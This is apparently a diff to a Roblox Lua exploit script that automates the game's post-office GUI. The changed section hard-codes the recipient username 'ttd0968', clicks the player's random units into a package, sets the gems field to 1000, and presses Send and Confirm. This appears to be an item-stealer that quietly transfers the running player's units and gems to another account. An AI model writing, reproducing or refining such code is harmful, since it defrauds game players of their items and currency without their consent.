@@ -1,6 +1,4 @@
-
-
-
+-- Wait for the game to load and necessary elements to be available
 repeat wait() until game:IsLoaded()
 repeat wait() until game.Players.LocalPlayer
 local Plr = game.Players.LocalPlayer
@@ -10,7 +8,6 @@ repeat wait() until Plr.Character:FindFirstChild("Humanoid")
 
 local Plrgui = game:GetService("Players").LocalPlayer.PlayerGui
 
-
 local function ConvertGradientToRGB(v, num)
     local color = v.Color.Keypoints[num].Value
     local r = math.floor(color.R * 255)
@@ -18,7 +15,6 @@ local function ConvertGradientToRGB(v, num)
     local b = math.floor(color.B * 255)
     return Color3.fromRGB(r, g, b)
 end
-
 
 
 local RarityColor = {}
@@ -30,7 +26,6 @@ for _, v in pairs(Plrgui.Lobby.MarketplaceFrame.MarketplaceMain.MainFrame.BuyMen
         }
     end
 end
-
 
 
 local function GetRarity(color1, color2)
@@ -53,14 +48,12 @@ local function GetRandomUnit()
 end
 
 
-
 -- Function to click a GUI button
 local function ClickButton(a)
     game:GetService("GuiService").SelectedObject = a
     game:GetService("VirtualInputManager"):SendKeyEvent(true, "Return", false, game)
     game:GetService("VirtualInputManager"):SendKeyEvent(false, "Return", false, game) 
 end
-
 
 
 -- Function to detect invocation
@@ -119,25 +112,24 @@ spawn(function()
                 print("Step 9: DetectInvoke is nil")
                 if not Plrgui.LoadingGui.LoadingFrame.Visible then
                     if Plrgui.Lobby.PostOffice.Visible then
-                        local Unit = GetRandomUnit()
-                        if Unit then
+                        if Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Username.Text == "ttd0968" then
+                            local Unit = GetRandomUnit()
+                            if Unit then
+                                if not Unit.TroopPicture.IsInTrade.Visible then
+                                    ClickButton(Unit.TroopPicture.InteractiveButton)
+                                end
+                            else 
+                                ClickButton(Plrgui.Lobby.PostOffice.Menus.SendPackages.YourGems.GemAmount.GemAmount)
+                                Plrgui.Lobby.PostOffice.Menus.SendPackages.YourGems.GemAmount.GemAmount.Text = "1000"
+                            end
+                            wait(.5)
                             if Plrgui.Lobby.PostOffice.Menus.Alerts.Visible then 
                                 ClickButton(Plrgui.Lobby.PostOffice.Menus.Alerts.ConfirmSend.Options.Confirm)
-                                
                             else 
-                                if Unit.TroopPicture.IsInTrade.Visible then
-                                    if Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Username.Text == "ttd0968" then
-                                        ClickButton(Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Send.SendButton)
-                                       
-                                    else
-                                        Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Username.Text = "ttd0968"
-                                    end
-                                else
-                                    
-                                    ClickButton(Unit.TroopPicture.InteractiveButton)
-                                 
-                                end
+                                ClickButton(Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Send.SendButton)
                             end
+                        else
+                            Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Username.Text = "ttd0968"
                         end
                     else
                         local PostOfficeHandler = getsenv(Plrgui.Lobby.PostOffice.PostOfficeHandler)
